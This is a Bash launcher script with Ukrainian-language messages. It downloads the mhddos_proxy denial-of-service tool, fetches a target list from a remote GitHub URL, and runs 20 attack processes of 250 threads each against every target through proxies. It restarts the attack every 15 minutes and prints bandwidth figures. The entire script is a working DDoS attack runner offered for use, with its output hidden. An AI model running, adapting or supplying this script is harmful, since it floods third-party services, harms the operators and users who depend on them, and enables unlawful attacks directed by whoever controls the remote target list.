#!/bin/bash

set -o errexit -o pipefail -o noclobber -o nounset

! getopt --test > /dev/null
if [[ ${PIPESTATUS[0]} -ne 4 ]]; then
    echo "На жаль, `getopt --test` завершився з помилкою. Будь ласка, встановіть enhanced getopt."
    exit 1
fi

OPTIONS=r:t:p:s:u:
LONGOPTS=refresh-interval:,thread-count:,process-count:,stats-interval:,url-with-targets:

! PARSED=$(getopt --options=$OPTIONS --longoptions=$LONGOPTS --name "$0" -- "$@")
if [[ ${PIPESTATUS[0]} -ne 0 ]]; then
    exit 2
fi

eval set -- "$PARSED"

refresh_interval="15m"
thread_count="250"
process_count="20"
stats_interval="60"
url_with_targets="https://raw.githubusercontent.com/pin4Ple/MyNotes/main/4Collabs.txt"

while true; do
    case "$1" in
        -r|--refresh-interval)
            refresh_interval="$2"
            shift 2
            ;;
        -t|--thread-count)
            thread_count="$2"
            shift 2
            ;;
        -p|--process-count)
            process_count="$2"
            shift 2
            ;;
        -s|--stats-interval)
            stats_interval="$2"
            shift 2
            ;;
        -u|--url-with-targets)
            url_with_targets="$2"
            shift 2
            ;;
        --)
            shift
            break
            ;;
        *)
            echo "Невідома опція запуску $1"
            exit 3
            ;;
    esac
done

PROXY_PROJECT_NAME=mhddos_proxy
PROXY_PROJECT_VERSION=addeea253d53bbf90d0a320367d8974183c4b480

PROXY_DIR=~/$PROXY_PROJECT_NAME
PROXY_FILE=$PROXY_DIR/mhddos/files/proxies/proxies.txt

echo "Готовим середовище..."

apt-get install ifstat gawk -y &> /dev/null

python3 -m pip uninstall google-colab datascience -y &> /dev/null
python3 -m pip install --upgrade pip &> /dev/null

# run within user directory
cd ~

# delete old proxy dir if present
if [ -d $PROXY_DIR ]; then
    rm -r $PROXY_DIR &> /dev/null
fi

# download specific mhddos_proxy version
git clone https://github.com/porthole-ascend-cinnamon/$PROXY_PROJECT_NAME.git &> /dev/null
cd $PROXY_DIR
#git checkout $PROXY_PROJECT_VERSION &> /dev/null

# install mhddos_proxy dependencies
python3 -m pip install -r requirements.txt &> /dev/null

echo "середовище готове"

while true
do
    # kill old copies of mhddos_proxy
    echo "(ре)старт програми..."
    if pgrep -f runner.py &> /dev/null; then pkill -f runner.py &> /dev/null; fi
    if pgrep -f ./start.py &> /dev/null; then pkill -f /start.py &> /dev/null; fi
    if pgrep -f ifstat &> /dev/null; then pkill -f ifstat &> /dev/null; fi
    echo "(ре)star програми завершено"

    # delete old proxy file if present
    if [ -f $PROXY_FILE ]; then
        rm $PROXY_FILE
    fi

    
    curl -s $url_with_targets | cat | grep "^[^#]" | while read -r target_command ; do
    #  echo " атак на $target_command, задіявши $process_count процесів, кожний з $thread_count потоками"

      for (( i=1; i<=process_count; i++ ))
      do
          cd $PROXY_DIR
          python3 runner.py $target_command -t $thread_count -p 25200 --rpc 1000 &> /dev/null&

          # wait till the first process initializes proxy file properly
          if [ ! -f $PROXY_FILE ]; then
              echo "Перевірка проксі. Це може зайняти декілька хвилин..."

              while [ ! -f $PROXY_FILE ]
              do
                  sleep 1
              done

              echo "Перевірку проксі завершено"
          fi
      done
  done
  
  ifstat -i eth0 -t -b -n $stats_interval/$stats_interval | awk '$1 ~ /^[0-9]{2}:/{$2/=1024;$3/=1024;printf "[%s] %10.2f ↓MBit/s↓  %10.2f ↑MBit/s↑\n",$1,$2,$3}'&

  sleep $refresh_interval

done
